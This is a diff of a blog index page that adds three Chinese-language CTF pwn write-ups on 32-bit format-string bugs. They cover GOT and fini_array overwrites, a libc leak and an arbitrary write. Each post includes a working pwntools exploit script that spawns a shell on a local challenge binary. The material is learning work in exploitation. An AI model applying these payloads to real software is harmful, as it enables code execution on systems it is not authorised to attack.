@@ -64,6 +64,147 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-32位格式化字符串之改写fini使程序反复" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/" class="article-date">
+  <time datetime="2023-06-01T12:58:50.000Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/">32位格式化字符串之改写fini使程序反复</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>参考博客:<a target="_blank" rel="noopener" href="https://charonpt.github.io/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/">https://charonpt.github.io/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/</a></p>
+<h2 id="查看程序保护"><a href="#查看程序保护" class="headerlink" title="查看程序保护"></a>查看程序保护</h2><p>pie没有开，可以直接在ida里面查找函数的got表地址。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601210038.png" alt="Alt text"></p>
+<h2 id="运行一下程序"><a href="#运行一下程序" class="headerlink" title="运行一下程序"></a>运行一下程序</h2><p>存在格式化字符串漏洞，只有一个输入一个输出。<br>格式化字符串参数的偏移为12。</p>
+<ul>
+<li><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/K3A4%7B~A58UHIKS7%7DAAZJN_T.png" alt="Alt text"><h2 id="ida一下下"><a href="#ida一下下" class="headerlink" title="ida一下下"></a>ida一下下</h2>发现了system函数<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601215124.png" alt="Alt text"><br>main函数中存在格式化字符串漏洞，<br>sprintf函数把数组V5中的数据和Nice to meet you, 拼接在一起然后存放在s数组中。<br>最后返回printf函数把数组s的数据输出到屏幕上。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601215852.png" alt="Alt text"><br>找到了fini_array函数<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601220407.png" alt="Alt text"></li>
+</ul>
+<p><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230602162652.png" alt="Alt text"></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>把由修改的字节数从小到大的顺序:先把strlen函数got表地址修改成程序里的system函数的地址，再把finit_arry函数的地址修改为start函数的地址使程序反复执行(为了能够输入system函数的参数:/bin/sh)</p>
+<p>最后在程序再一次执行到输入的时候在发送/bin/sh从而获得shell。   </p>
+<h2 id="查找strlen函数got表地址"><a href="#查找strlen函数got表地址" class="headerlink" title="查找strlen函数got表地址"></a>查找strlen函数got表地址</h2><p>注意，查找的不是strlen函数的地址，而是strlen函数got表的地址<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230602170950.png" alt="Alt text"><br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230602172103.png" alt="Alt text"></p>
+<h2 id="在脚本中插入gdb运行一下"><a href="#在脚本中插入gdb运行一下" class="headerlink" title="在脚本中插入gdb运行一下"></a>在脚本中插入gdb运行一下</h2><p>从而找到函数地址的偏移及是否栈对齐。<br>可以看到地址分别在格式化字符串的第21、22、23个参数里。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230602170601.png" alt="Alt text"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x80484F0</span></span><br><span class="line">finit_addr = <span class="number">0x8049934</span></span><br><span class="line">system_addr = <span class="number">0x8048490</span></span><br><span class="line">strlen_got = <span class="number">0x8049A54</span></span><br><span class="line">payload = b<span class="string">&quot;AA&quot;</span> + b<span class="string">&quot;%2032c%21$hn&quot;</span> + b<span class="string">&quot;%31884c%22$hn&quot;</span> + b<span class="string">&quot;%96c%23$hn&quot;</span> + b<span class="string">&quot;A&quot;</span> + <span class="title function_">p32</span>(strlen_got+<span class="number">2</span>) + <span class="title function_">p32</span>(strlen_got) + <span class="title function_">p32</span>(finit_addr)</span><br><span class="line">#gdb.<span class="title function_">attach</span>(io,b<span class="string">&quot;b *0x804864F&quot;</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;your name...&quot;</span>,payload)</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;your name...&quot;</span>,b<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol>
+<li>写这道题的脚本过程中，不知道为什么，我要是使用io.recvuntil()<br>io.send(payload)这样的接收发送形式的话，我就不能够在脚本运行的时候进行gdb。<br>而换成io.sendlineafter(b””,payload)才能够在脚本运行的时候进行gdb。</li>
+<li>要注意，查找的不是strlen函数的地址，而是strlen函数got表的地址</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/" data-id="cll1p3fin0007okv9dqngftlj" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-32位格式化字符串之更改got表" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/" class="article-date">
+  <time datetime="2023-06-01T07:45:55.000Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/">32位格式化字符串之更改got表</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="检查程序的保护"><a href="#检查程序的保护" class="headerlink" title="检查程序的保护"></a>检查程序的保护</h3><p>没有canary，RELRO半开，所以got表可写<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/1.png" alt="Alt text"></p>
+<h3 id="运行一下程序"><a href="#运行一下程序" class="headerlink" title="运行一下程序"></a>运行一下程序</h3><p>可以看到第一次输入的格式化字符串参数的偏移是8<br>第二次输入的格式化字符串参数的偏移也是8，而且从第二次开始似乎可以输入无限次。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/23SEQ_6CU%5BO8H%7D9LX9%7DX%60BD.png" alt="Alt text"></p>
+<h3 id="ida查看程序"><a href="#ida查看程序" class="headerlink" title="ida查看程序"></a>ida查看程序</h3><p>可以看到存在格式化字符串漏洞，输入的值存放在字符变量s里。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/@@MF%60JK%60W%7DN~_LSK%5BKGRNJA.png" alt="Alt text"><br>可以看到程序里没有给我们提供system函数和/bin/sh字符<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/QQ%E6%88%AA%E5%9B%BE20230601160711.png" alt="Alt text"></p>
+<p><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/QQ%E6%88%AA%E5%9B%BE20230601160736.png" alt="Alt text"></p>
+<h4 id="注意sprintf函数"><a href="#注意sprintf函数" class="headerlink" title="注意sprintf函数"></a>注意sprintf函数</h4><p>sprintf函数把Repeater:和%s拼接在一起然后放在了数组format里。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>程序没有给我们提供system函数和/bin/sh字符而且也看不到任何能够获得shell的函数，但是程序的保护RELRO半开，所以got表可写，还存在格式化字符串我们可以通过格式化字符串漏洞先把libc的偏移泄露出来获得system函数got表地址，strlen函数的参数是format数组(也就是我们输入的值的存放的地方)，我们可以把strlen函数的got表地址修改成system函数got表地址，然后在第二次发送的时候发送/bin/sh作为system函数的参数就可以获得程序的shell了。</p>
+<h3 id="gdb一下程序"><a href="#gdb一下程序" class="headerlink" title="gdb一下程序"></a>gdb一下程序</h3><p>我们在第一次输出的地方输入”AAAA”之后马上查看栈上的情况，可以看到__libc_start_main+241在栈上的地址为0xffffcf2c<br>而我们格式化字符串第一个参数在栈上的地址为0xffffccd4  </p>
+<p>计算: 0xf2c-0xcd4 = 0x258 = 600<br>600/4 + 1 = 151<br>因此__libc_start_main+241在格式化字符串的第151个参数上。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/3.png" alt="Alt text"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>其中strlen函数got表地址在格式化字符串参数的偏移需要通过gdb调试一下才能确定。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./axbfmt&quot;</span>)</span><br><span class="line">libc = <span class="title function_">ELF</span>(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line">elf = <span class="title function_">ELF</span>(<span class="string">&quot;./axbfmt&quot;</span>)</span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Please tell me:&quot;</span>,b<span class="string">&quot;%151$p&quot;</span>)</span><br><span class="line">io.<span class="title function_">recvuntil</span>(b<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_addr = <span class="title function_">int</span>(io.<span class="title function_">recv</span>(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">241</span></span><br><span class="line">libc_base = libc_addr - libc.<span class="property">sym</span>[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.<span class="property">sym</span>[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">#binsh_addr = libc_base + <span class="title function_">next</span>(libc.<span class="title function_">search</span>(b<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">#printf_addr = <span class="number">0x804A014</span></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>((system_addr&amp;<span class="number">0xffff</span>)-<span class="number">9</span>) + b<span class="string">&quot;c%16$hn&quot;</span>##减<span class="number">9</span>是因为sprintf函数在变量s前面拼接了</span><br><span class="line"><span class="number">9</span>个字符(<span class="title class_">Repeater</span>:)</span><br><span class="line">payload += b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>(((system_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>) </span><br><span class="line">- (system_addr&amp;<span class="number">0xffff</span>)) + b<span class="string">&quot;c%17$hn&quot;</span> + b<span class="string">&quot;AAAAAAA&quot;</span></span><br><span class="line">#多输入<span class="number">7</span>个A是为了让strlen在got的地址能够栈对齐。</span><br><span class="line">#payload = payload.<span class="title function_">ljust</span>(<span class="number">0x30</span>+<span class="number">1</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload += <span class="title function_">p32</span>(elf.<span class="property">got</span>[<span class="string">&quot;strlen&quot;</span>]) + <span class="title function_">p32</span>(elf.<span class="property">got</span>[<span class="string">&quot;strlen&quot;</span>]+<span class="number">2</span>)</span><br><span class="line">#gdb.<span class="title function_">attach</span>(io,b<span class="string">&quot;b *0x80486E2&quot;</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Please tell me:&quot;</span>,payload)</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Please tell me:&quot;</span>,b<span class="string">&quot;;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/" data-id="cll1p3fin0008okv9gj3g9s2o" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-32位格式化字符串-任意地址写就行2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/" class="article-date">
+  <time datetime="2023-06-01T06:56:27.623Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/">32位格式化字符串-任意地址写就行2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="检查程序的保护"><a href="#检查程序的保护" class="headerlink" title="检查程序的保护"></a>检查程序的保护</h3><p>发现canary和NX开了，那么栈溢出基本无望。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/1.png" alt="Alt text"></p>
+<h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p>发现第一个输入的地方就存在格式化字符串漏洞，而且第二个输出的地方似乎是要验证通过的。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/3O_G@OLSK%60O0GTCPMI6NJDT.png" alt="Alt text"></p>
+<h3 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h3><p>发现第二个输入的地方果然是用来验证通过的，只有你输入的东西等于dword_804c044这个位置存放的值才能够获得shell<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/XS2SGX%605TE%7B~BTV0YV0P_55.png" alt="Alt text"></p>
+<h4 id="让我们来点开dword-804c044"><a href="#让我们来点开dword-804c044" class="headerlink" title="让我们来点开dword_804c044"></a>让我们来点开dword_804c044</h4><p>可以看到dword_804c044的值是存放在bss区里的，还知道了地址。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/2.png" alt="Alt text"></p>
+<h3 id="看偏移"><a href="#看偏移" class="headerlink" title="看偏移"></a>看偏移</h3><p>可以看到第一次输入的格式化字符串参数为printf函数的第11个参数。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/3O_G@OLSK%60O0GTCPMI6NJDT.png" alt="Alt text"></p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>事情发展到这一步，我们的解题思路就非常清晰了。<br>即在第一次输入的时候利用格式化字符串漏洞吧dword_804c044修改成一个自己知道的值，然后在第二次输入的时候输入那个值就行了。</p>
+<h3 id="请收下我的exp"><a href="#请收下我的exp" class="headerlink" title="请收下我的exp"></a>请收下我的exp</h3><p>因为0x804c044这个地址本身就占了四个字节，所以直接修改就完事了。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">payload = <span class="title function_">p32</span>(<span class="number">0x804c044</span>) + b<span class="string">&quot;%10$n&quot;</span></span><br><span class="line">gdb.<span class="title function_">attach</span>(io,b<span class="string">&quot;b *0x80492B2&quot;</span>)</span><br><span class="line"><span class="title function_">pause</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(payload)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/" data-id="cll1p3fim0004okv9fkhf5x99" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-32位格式化字符串-任意地址写就行" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/" class="article-date">
@@ -103,7 +244,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/" data-id="clj0t6tge000334v9fm4s3y8k" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/" data-id="cll1p3fim0005okv9e4zggznj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -161,7 +302,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/" data-id="clj0t6tgg000734v91a0fht35" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/" data-id="cll1p3fio0009okv9fttj1lny" class="article-share-link">Share</a>
       
       
     </footer>
@@ -205,7 +346,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/29/shaokao/" data-id="clj0t6tgk000c34v9cuhta2db" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/29/shaokao/" data-id="cll1p3fit000eokv91saw0qmw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -266,7 +407,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/29/canary%E7%88%86%E7%A0%B4/" data-id="clj0t6tgk000b34v92kgr3y18" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/29/canary%E7%88%86%E7%A0%B4/" data-id="cll1p3fiq000cokv9elz7fpko" class="article-share-link">Share</a>
       
       
     </footer>
@@ -299,7 +440,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li></ul>
     </div>
   </div>
 
@@ -312,23 +453,23 @@
       <ul>
         
           <li>
+            <a href="/2023/07/02/%E8%80%83%E6%A0%B8-pwn1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BF%AE%E6%94%B9%E9%9A%8F%E6%9C%BA%E5%80%BC%E3%80%81%E6%B3%84%E9%9C%B2canary%E5%80%BC-mprotect%E6%8F%90%E6%9D%83-%E6%A0%88%E8%BF%81%E7%A7%BB/">考核.pwn1:格式化字符串修改随机值、泄露canary值+mprotect提权+栈迁移</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/02/%E8%80%83%E6%A0%B8-xxs-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9B%B4%E6%94%B9got%E8%A1%A8%E5%8F%8A%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E7%9A%84%E5%8F%A6%E7%B1%BB%E6%96%B9%E6%B3%95/">考核.xxs:格式化字符串更改got表及修改数据的另类方法</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/25/AWD%E4%B9%8Bpwn/">AWD之pwn</a>
+          </li>
+        
+          <li>
             <a href="/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/">32位shellcode：手拼shellcode</a>
           </li>
         
           <li>
             <a href="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/">32位shellcode使用mprotect提升权限执行shellcode</a>
-          </li>
-        
-          <li>
-            <a href="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/">32位shellcode:绕过strcmp函数和计算shellcode在栈上的偏移。</a>
-          </li>
-        
-          <li>
-            <a href="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/">32位shellcode(其实是32位syscall)</a>
-          </li>
-        
-          <li>
-            <a href="/2023/06/07/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
           </li>
         
       </ul>
